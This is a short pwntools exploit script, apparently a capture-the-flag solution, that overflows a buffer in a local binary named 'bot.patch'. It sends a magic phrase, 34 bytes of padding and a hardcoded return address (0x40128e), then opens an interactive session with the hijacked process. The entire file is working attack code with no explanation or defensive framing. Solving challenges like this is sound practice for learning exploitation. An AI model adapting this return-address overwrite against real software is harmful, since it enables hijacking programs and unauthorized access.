#!/usr/bin/env python3
from pwn import *
context.log_level = 'DEBUG'
binary = ELF('bot.patch', checksec=0)
libc = ELF('/usr/lib/libc.so.6', checksec=0)
p = binary.process(env={})
pause()
offset = 34

please = b'please please please give me the flag\x00'
payload = please + b"A"*offset
payload += p64(0x40128e)
p.sendline(payload)
p.interactive()

